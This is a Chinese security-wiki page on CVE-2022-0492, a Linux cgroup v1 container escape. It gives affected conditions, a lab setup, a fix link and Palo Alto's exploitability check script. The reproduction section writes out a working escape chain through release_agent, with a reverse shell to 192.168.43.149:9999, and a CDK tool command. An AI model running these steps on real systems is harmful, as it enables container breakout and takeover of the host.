<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Linux 内核 cgroup v1 逻辑错误导致容器逃逸 CVE-2022-0492 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Linux \u5185\u6838 cgroup v1 \u903b\u8f91\u9519\u8bef\u5bfc\u81f4\u5bb9\u5668\u9003\u9038 CVE-2022-0492", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u6f0f\u6d1e POC", url: "#poc" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../MinIO%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../MinIO%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/" class="btn btn-xs btn-link">
        MinIO SSRF 漏洞 CVE-2021-21287
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/" class="btn btn-xs btn-link">
        Kubernetes 部署后门 Daemonset
      </a>
    </div>
    
  </div>

    

    <h1 id="linux-cgroup-v1-cve-2022-0492">Linux 内核 cgroup v1 逻辑错误导致容器逃逸 CVE-2022-0492<a class="headerlink" href="#linux-cgroup-v1-cve-2022-0492" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>该漏洞是由于 control groups（cgroups）中的一个逻辑错误所致。Control Groups（cgroups）是一个 Linux 特性，允许管理员限制、记录和隔离一组进程所使用的资源。Linux 支持两种 cgroup 架构，分别名为 cgroup v1 和 cgroup v2，该漏洞只影响 cgroup v1 架构。</p>
<p>如果容器运行了以下操作，则可逃逸：</p>
<ul>
<li>以 root 用户身份运行，或没有为容器进程设置 <a href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/security-context/">no_new_privs</a> 标志；</li>
<li>没有启用 AppArmor 或 <a href="https://www.redhat.com/en/topics/linux/what-is-selinux#:~:text=Security%2DEnhanced%20Linux%20SELinuxSELinux,Linux%20Security%20Modules%20LSMLSM.">SELinux</a> 进行保护；</li>
<li>没有启用  <a href="https://docs.docker.com/engine/security/seccomp/">Seccomp</a>  进行保护；</li>
<li>在启用了非特权用户命名空间的主机上运行；</li>
<li>隶属于 root v1 cgroup。</li>
</ul>
<p>或满足下列条件，则可逃逸：</p>
<ul>
<li>具有 CAP_SYS_ADMIN 权限；</li>
<li>没有启用 AppArmor 或 SELinux 进行保护；</li>
<li>没有创建 cgroup 命名空间；</li>
<li>隶属于 root v1 cgroup。</li>
</ul>
<p>参考链接：</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0492">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0492</a></li>
<li><a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/">https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/</a></li>
<li><a href="http://terenceli.github.io/技术/2022/03/06/cve-2022-0492">http://terenceli.github.io/技术/2022/03/06/cve-2022-0492</a></li>
<li><a href="https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492">https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492</a></li>
<li><a href="https://github.com/Metarget/metarget">https://github.com/Metarget/metarget</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>基础环境准备（Docker + Minikube + Kubernetes），可参考 <a href="https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Kubernetes + Ubuntu 18.04 漏洞环境搭建</a> 完成。</p>
<p>本例中各组件版本如下：</p>
<div class="highlight"><pre><span></span><code>Docker version: 19.03.6
</code></pre></div>
<p>Linux 内核版本 <code>5.4.0-84-generic</code>：</p>
<div class="highlight"><pre><span></span><code>uname -a
Linux ubuntu 5.4.0-84-generic #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
</code></pre></div>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603105827303.png" /></p>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>创建禁用了 AppArmor 和 Seccomp 的容器：</p>
<div class="highlight"><pre><span></span><code>docker run -it --name cve-2022-0492 --security-opt=&quot;seccomp=unconfined&quot; --security-opt=&quot;apparmor=unconfined&quot; ubuntu:latest /bin/bash
</code></pre></div>
<p>AppArmor 和 SELinux 都会阻止挂载，这意味着使用其中任何一种方式运行的容器都受到保护 。如果两者皆禁用，容器可以通过滥用用户命名空间来挂载 cgroupfs。</p>
<p>挂载 cgroupfs 需要在托管当前 cgroup 命名空间的用户命名空间中拥有 <code>CAP_SYS_ADMIN</code> 权限。默认情况下，容器运行时没有 <code>CAP_SYS_ADMIM</code> 权限 ，因此无法在初始用户命名空间中挂载 cgroupfs。但是，通过 <code>unshare()</code> 系统调用，容器可以创建新的用户和 cgroup 命名空间，并在这些命名空间中拥有 <code>CAP_SYS_ADMIN</code> 权限并可以挂载 cgroupfs：</p>
<ul>
<li>第一步，创建一个新的用户和 cgroup 命名空间，它将具有 <code>CAP_SYS_ADMIN</code> 权限：</li>
</ul>
<div class="highlight"><pre><span></span><code>root@0c782b51c5ac:/# unshare -UrmC bash
</code></pre></div>
<blockquote>
<p>并非所有容器都能创建新的用户命名空间—— 宿主机必须启用非特权用户命名空间 。在最近的 Ubuntu 版本中，这是默认设置。由于 Seccomp 会阻止 <code>unshare()</code> 系统调用， 因此只有在未启用 Seccomp 的情况下运行的容器才能创建新的用户命名空间 。</p>
</blockquote>
<ul>
<li>第二步，容器在新的用户和 cgroup 命名空间中挂载 root RDMA cgroup：</li>
</ul>
<div class="highlight"><pre><span></span><code>root@0c782b51c5ac:/# mount -it cgroup -o rdma cgroup /mnt
</code></pre></div>
<ul>
<li>第三步，在 cgroup 中创建一个名为 <code>w</code> 的子组，开启 release agent，设置 <code>notify_on_release=1</code>：</li>
</ul>
<div class="highlight"><pre><span></span><code>root@0c782b51c5ac:/# d=`dirname $(ls -x /mnt/r* |head -n1)`
root@0c782b51c5ac:/# mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
</code></pre></div>
<ul>
<li>第四步，从 <code>/etc/mtab</code> 中提取 cgroup 临时路径，将 <code>exp.sh</code> 路径写入 <code>/mnt/release_agent</code>：</li>
</ul>
<div class="highlight"><pre><span></span><code>root@0c782b51c5ac:/# t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`
root@0c782b51c5ac:/# printf &#39;#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/192.168.43.149/9999 0&gt;&amp;1&#39; &gt; /exp.sh; chmod 777 /exp.sh
root@0c782b51c5ac:/# echo &quot;$t/exp.sh&quot; &gt; $d/release_agent
</code></pre></div>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603111941141.png" /></p>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603113252638.png" /></p>
<ul>
<li>第五步，创建一个马上终止的进程，当 <code>w</code> 子组的最后一个进程退出时，将激活 <code>/mnt/release_agent</code>：</li>
</ul>
<div class="highlight"><pre><span></span><code>root@0c782b51c5ac:/# sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;
</code></pre></div>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603110039518.png" /></p>
<p>监听 9999 端口，获取反弹 shell：</p>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603103539046.png" /></p>
<p>也可以通过 <a href="https://github.com/cdk-team/CDK">CDK</a> 复现。下载 CDK ，并将其传入容器 <code>/tmp</code> 目录下，执行命令：</p>
<div class="highlight"><pre><span></span><code>./cdk run mount-cgroup &quot;whoami&quot; rdma
</code></pre></div>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603115127954.png" /></p>
<blockquote>
<p>注意，cdk 默认为 memory cgroup，权限不足，需要指定为 rdma。</p>
</blockquote>
<p><img alt="" src="../images/Linux%20%E5%86%85%E6%A0%B8%20cgroup%20v1%20%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2022-0492/image-20250603115247636.png" /></p>
<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/PaloAltoNetworks/can-ctr-escape-cve-2022-0492/blob/main/can-ctr-escape-cve-2022-0492.sh">can-ctr-escape-cve-2022-0492.sh</a></p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Testing whether CVE-2022-0492 can be exploited for container escape&quot;</span><span class="w"> </span>

<span class="c1"># Setup test dir</span>
<span class="nv">test_dir</span><span class="o">=</span>/tmp/.cve-2022-0492-test
<span class="k">if</span><span class="w"> </span>!<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$test_dir</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ERROR: failed to create test directory at </span><span class="nv">$test_dir</span><span class="s2">&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="k">fi</span>

<span class="c1"># Test whether escape via CAP_SYS_ADMIN is possible</span>
<span class="k">if</span><span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>cgroup<span class="w"> </span>-o<span class="w"> </span>memory<span class="w"> </span>cgroup<span class="w"> </span><span class="nv">$test_dir</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">test</span><span class="w"> </span>-w<span class="w"> </span><span class="nv">$test_dir</span>/release_agent<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[!] Exploitable: the container can escape as it possesses CAP_SYS_ADMIN and runs without AppArmor or SELinux. Note that it likely doesn&#39;t need CVE-2022-0492 to escape.&quot;</span>
<span class="w">        </span>umount<span class="w"> </span><span class="nv">$test_dir</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="nv">$test_dir</span>
<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span>
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span>umount<span class="w"> </span><span class="nv">$test_dir</span>
<span class="k">fi</span>

<span class="c1"># Test whether escape via user namespaces is possible</span>
<span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>subsys
<span class="k">do</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span>unshare<span class="w"> </span>-UrmC<span class="w"> </span>--propagation<span class="o">=</span>unchanged<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;mount -t cgroup -o </span><span class="nv">$subsys</span><span class="s2"> cgroup </span><span class="nv">$test_dir</span><span class="s2"> 2&gt;&amp;1 &gt;/dev/null &amp;&amp; test -w </span><span class="nv">$test_dir</span><span class="s2">/release_agent&quot;</span><span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[!] Exploitable: the container can abuse user namespaces to escape&quot;</span>
<span class="w">        </span>rm<span class="w"> </span>-rf<span class="w"> </span><span class="nv">$test_dir</span>
<span class="w">        </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span>
<span class="w">    </span><span class="k">fi</span>
<span class="k">done</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/proc/<span class="nv">$$</span>/cgroup<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-Eo<span class="w"> </span><span class="s1">&#39;[0-9]+:[^:]+&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-Eo<span class="w"> </span><span class="s1">&#39;[^:]+$&#39;</span><span class="k">)</span>

<span class="c1"># Cannot escape via either method</span>
rm<span class="w"> </span>-rf<span class="w"> </span><span class="nv">$test_dir</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[+] Contained: cannot escape via CVE-2022-0492&quot;</span>
</code></pre></div>
<h2 id="_4">漏洞修复<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<ul>
<li>升级补丁 <a href="https://access.redhat.com/security/cve/cve-2022-0492">https://access.redhat.com/security/cve/cve-2022-0492</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../MinIO%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../MinIO%20SSRF%20%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/" class="btn btn-xs btn-link">
        MinIO SSRF 漏洞 CVE-2021-21287
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Kubernetes%20%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8%20Daemonset/" class="btn btn-xs btn-link">
        Kubernetes 部署后门 Daemonset
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>